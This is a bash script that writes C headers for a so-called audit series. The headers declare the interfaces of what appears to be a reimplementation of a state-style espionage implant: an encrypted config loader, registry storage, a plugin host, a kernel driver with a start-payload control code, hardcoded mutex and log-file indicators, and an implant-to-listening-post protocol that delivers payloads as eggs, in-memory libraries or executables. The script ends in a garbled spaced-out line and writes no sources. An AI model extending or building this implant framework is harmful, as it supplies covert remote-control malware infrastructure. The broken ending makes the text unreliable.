#!/usr/bin/env bash
# Applies the full 70-commit audit series. Run from repo root.
set -euo pipefail
[ -d .git ] || { echo "run from repo root"; exit 1; }
mkdir -p include src harness tests/fixtures docs def .github/workflows

# ---------- headers ----------
cat > include/eq_common.h <<'EOF'
#ifndef EQ_COMMON_H
#define EQ_COMMON_H
#include <stdint.h>
#include <stddef.h>

typedef uint8_t  u8;  typedef uint16_t u16;
typedef uint32_t u32; typedef uint64_t u64;

#define EQ_OK 0
#define EQ_MORE 1
#define EQ_ERR -1
#define EQ_ERR_ARG -2
#define EQ_ERR_CRYPTO -3
#define EQ_ERR_IO -4

u16  eq_get_be16(const u8 *p);
u32  eq_get_be32(const u8 *p);
u32  eq_get_le32(const u8 *p);
void eq_put_be16(u8 *p, u16 v);
void eq_put_be32(u8 *p, u32 v);
void eq_put_le32(u8 *p, u32 v);
const char *eq_strerror(int rc);
#endif
EOF

cat > src/eq_common.c <<'EOF'
#include "eq_common.h"
u16 eq_get_be16(const u8 *p){ return (u16)(((u16)p[0] << 8) | p[1]); }
u32 eq_get_be32(const u8 *p){ return ((u32)p[0]<<24)|((u32)p[1]<<16)|((u32)p[2]<<8)|p[3]; }
u32 eq_get_le32(const u8 *p){ return ((u32)p[3]<<24)|((u32)p[2]<<16)|((u32)p[1]<<8)|p[0]; }
void eq_put_be16(u8 *p, u16 v){ p[0]=(u8)(v>>8); p[1]=(u8)v; }
void eq_put_be32(u8 *p, u32 v){ p[0]=(u8)(v>>24); p[1]=(u8)(v>>16); p[2]=(u8)(v>>8); p[3]=(u8)v; }
void eq_put_le32(u8 *p, u32 v){ p[0]=(u8)v; p[1]=(u8)(v>>8); p[2]=(u8)(v>>16); p[3]=(u8)(v>>24); }
const char *eq_strerror(int rc){ switch(rc){ case EQ_OK: return "ok"; case EQ_MORE: return "more"; case EQ_ERR: return "error"; case EQ_ERR_ARG: return "bad argument"; case EQ_ERR_CRYPTO: return "crypto failure"; case EQ_ERR_IO: return "i/o failure"; default: return "unknown"; } }
EOF

cat > include/rc5.h <<'EOF'
#ifndef RC5_H
#define RC5_H
#include "eq_common.h"
#define RC5_ROUNDS 12
#define RC5_MAX_ROUNDS 32
#define RC5_MAX_SUBWORDS (2 * (RC5_MAX_ROUNDS + 1))
typedef struct { u32 S[RC5_MAX_SUBWORDS]; int rounds; } rc5_ctx;
int rc5_init(rc5_ctx *c, const u8 *key, size_t keylen);
int rc5_init_rounds(rc5_ctx *c, const u8 *key, size_t keylen, int rounds);
void rc5_encrypt_block(const rc5_ctx *c, const u8 in[8], u8 out[8]);
void rc5_decrypt_block(const rc5_ctx *c, const u8 in[8], u8 out[8]);
int rc5_cbc_encrypt(const rc5_ctx *c, const u8 iv[8], const u8 *in, size_t len, u8 *out);
int rc5_cbc_decrypt(const rc5_ctx *c, const u8 iv[8], const u8 *in, size_t len, u8 *out);
int rc5_selftest(void);
#endif
EOF

cat > include/sha1.h <<'EOF'
#ifndef SHA1_H
#define SHA1_H
#include "eq_common.h"
typedef struct { u32 h[5]; u64 len; u8 buf[64]; size_t bufn; } sha1_ctx;
void sha1_init(sha1_ctx *c);
void sha1_update(sha1_ctx *c, const u8 *p, size_t n);
void sha1_final(sha1_ctx *c, u8 out[20]);
#endif
EOF

cat > include/registry.h <<'EOF'
#ifndef REGISTRY_H
#define REGISTRY_H
#include "eq_common.h"
#define ED_REG_HIVE "Software\\"
typedef enum { ED_REG_TARGET=0, ED_REG_PAYLOAD, ED_REG_CONFIG, ED_REG_STARTTIME } ed_reg_field;
void ed_reg_name_hex(const char *logical, char out[41]);
const char *ed_reg_logical(ed_reg_field f);
int ed_reg_open(void);
int ed_reg_set(const char *logical, const u8 *val, u32 len);
int ed_reg_get(const char *logical, u8 *out, u32 cap, u32 *got);
int ed_reg_del(const char *logical);
#endif
EOF

cat > include/ed_plugin.h <<'EOF'
#ifndef ED_PLUGIN_H
#define ED_PLUGIN_H
#include "eq_common.h"
typedef u32 (*ed_ordinal1_fn)(void);
typedef u32 (*ed_ordinal2_fn)(void *cfg, u32 cfg_len);
typedef u32 (*ed_ordinal3_fn)(void *in, u32 in_len, void *out, u32 out_cap);
typedef void (*ed_ordinal4_fn)(void);
#define ED_PLUGIN_ID_MIN 0x8000
#define ED_REG_KEY "MemSubSys\\1"
void *ed_plugin_open(const char *path);
void ed_plugin_close(void *h);
const char *ed_plugin_error(void);
int ed_plugin_load(void *h, void **out_ordinals);
int ed_plugin_id_valid(u32 id);
int EdPluginHostEnumerate(const char *const *paths, size_t n, u32 *ids, size_t max, size_t *found);
#endif
EOF

cat > include/ed_config.h <<'EOF'
#ifndef ED_CONFIG_H
#define ED_CONFIG_H
#include "eq_common.h"
#define ED_MUTEX "{01C482BA-BD31-4874-A08B-A93EA5BCE511}"
#define ED_EVENT "{D0385CB7-B834-45D1-A501-1A1700E6C34E}"
#define ED_LOGFILE "~yh56816.tmp"
#define ED_CONFIG_MAX 64
typedef struct { u16 type; u16 size; const u8 *value; } ed_record;
int ed_config_parse(const u8 *buf, size_t len, ed_record *out, size_t max);
const ed_record *ed_config_find(const ed_record *recs, size_t n, u16 type);
int ed_config_crypt_rc5(u8 *buf, size_t len, const u8 *key, size_t keylen, const u8 iv[8], int encrypt);
int ed_config_crypt_rc5_rounds(u8 *buf, size_t len, const u8 *key, size_t keylen, const u8 iv[8], int encrypt, int rounds);
int ed_config_share2_records(const u8 *buf, size_t len, ed_record *out, size_t max);
int ed_config_from_share2(const u8 *buf, size_t len);
int EdConfigFromShare2(const u8 *buf, size_t len);
int EdConfigLoad(const char *path, u8 *buf, size_t cap, size_t *used);
#endif
EOF

cat > include/ed_share2.h <<'EOF'
#ifndef ED_SHARE2_H
#define ED_SHARE2_H
#include "eq_common.h"
#define ED_SHARE2_MAGIC 0x63959700u
#define ED_SHARE2_HDR 0x20
#define ED_SHARE2_BODY (ED_SHARE2_HDR - 8)
typedef struct { u32 magic; u32 size; u8 raw[ED_SHARE2_BODY]; } ed_share2_hdr;
int ed_config_from_share2(const u8 *buf, size_t len);
#endif
EOF

cat > include/ed_ioctl.h <<'EOF'
#ifndef ED_IOCTL_H
#define ED_IOCTL_H
#include <ntddk.h>
#define ED_IOCTL_BASE 0x800
#define ED_IOCTL_QUERY_CONFIG CTL_CODE(ED_IOCTL_BASE,0x01,METHOD_BUFFERED,FILE_ANY_ACCESS)
#define ED_IOCTL_SET_CONFIG CTL_CODE(ED_IOCTL_BASE,0x02,METHOD_BUFFERED,FILE_ANY_ACCESS)
#define ED_IOCTL_START_PAYLOAD CTL_CODE(ED_IOCTL_BASE,0x03,METHOD_BUFFERED,FILE_ANY_ACCESS)
#define ED_IOCTL_QUERY_STATE CTL_CODE(ED_IOCTL_BASE,0x04,METHOD_BUFFERED,FILE_ANY_ACCESS)
#define ED_IOCTL_QUERY_STATS CTL_CODE(ED_IOCTL_BASE,0x05,METHOD_BUFFERED,FILE_ANY_ACCESS)
#define ED_DEVICE_NAME L"\\Device\\msndsrv"
#define ED_SYMLINK_NAME L"\\DosDevices\\msndsrv"
typedef struct { ULONG magic; ULONG state; ULONG rx_frames; ULONG tx_frames; } ED_STATE;
#define ED_DRV_MAGIC 0x64734E6Du
#endif
EOF

cat > include/pc_proto.h <<'EOF'
#ifndef PC_PROTO_H
#define PC_PROTO_H
#include "eq_common.h"
#define PC_HDR_IMPLANT 8
#define PC_HDR_LP 16
#define PC_BLOCK 16
#define PC_MAX_BODY 0x10000
#define PC_HDR_MAX 512
#define PC_DEFAULT_TIMEOUT_MS 10000
#define PC_BLOB_LEN 36
#define PC_BLOB_OFF_LIBTYPE 16
#define PC_BLOB_OFF_UNK20 20
#define PC_BLOB_OFF_SENDSIZE 24
#define PC_BLOB_OFF_CHECKSUM 28
#define PC_BLOB_OFF_RUNTYPE 30
#define PC_BLOB_OFF_FLAGS 32
#define PC_BLOB_OFF_TAIL 34
#define PC_RUN_EGG 1
#define PC_RUN_MEMLIB 2
#define PC_RUN_FILELIB 3
#define PC_RUN_EXE 4
#define PC_ARCH_X64 8
#define PC_PLATFORM_WINNT 1
#define PC_HELLO_LEN 48
#define PC_RSA_LEN 256
#define PC_PUBKEY_LEN 516
#define PC_INVALID_SOCK (-1)
typedef int pc_sock_t;
typedef char pc_hdr_bound_check[(PC_HDR_MAX > 2 * 64 + 200) ? 1 : -1];
typedef struct { u8 lead; u8 ver_major; u8 ver_sub; u8 ver_minor; u8 ver_build; u8 pad5[3]; u8 session_key[16]; u8 pc_id[8]; u8 pad32[2]; u16 arch1; u16 pad36; u16 arch2; u16 pad40; u16 plat1; u16 pad44; u16 plat2; } pc_hello_t;
typedef char pc_hello_size_check[(sizeof(pc_hello_t) == PC_HELLO_LEN) ? 1 : -1];
typedef struct { char lp_ip[64]; u16 lp_port; char hdr_name[16]; u32 connid; u32 conn_counter; u32 seq; u32 lp_seq; u8 session_key[16]; u8 iv[16]; u8 iv_msg[16]; int crypto_on; int sub_msg; int hs_state; size_t exe_total; u32 timeout_ms; u8 hello_lead; char pc_id[9]; u8 pc_major, pc_sub, pc_minor; u8 ptbuf[PC_MAX_BODY]; pc_sock_t sock; } pc_session_t;
int pc_session_init(pc_session_t *s, const char *ip, u16 port, const char *hdr);
int pc_reconnect(pc_session_t *s);
int pc_build_header(char *out, size_t cap, const pc_session_t *s, u32 body_len);
void pc_build_hello(pc_hello_t *h, const pc_session_t *s);
int pc_send(pc_session_t *s, const u8 *payload, u32 len);
int pc_recv(pc_session_t *s, u8 *out, u32 cap, u32 *out_len);
void pc_handshake_begin(pc_session_t *s);
int pc_handshake_step(pc_session_t *s, const u8 *pubkey, size_t pubkey_len, u8 *exe_out, size_t exe_cap, size_t *exe_len);
int pc_handshake(pc_session_t *s, const u8 *pubkey, size_t pubkey_len, u8 *exe_out, size_t exe_cap, size_t *exe_len);
#endif
EOF

echo "headers written"
a p p e n d i n g   s o u r c e s . . .  
 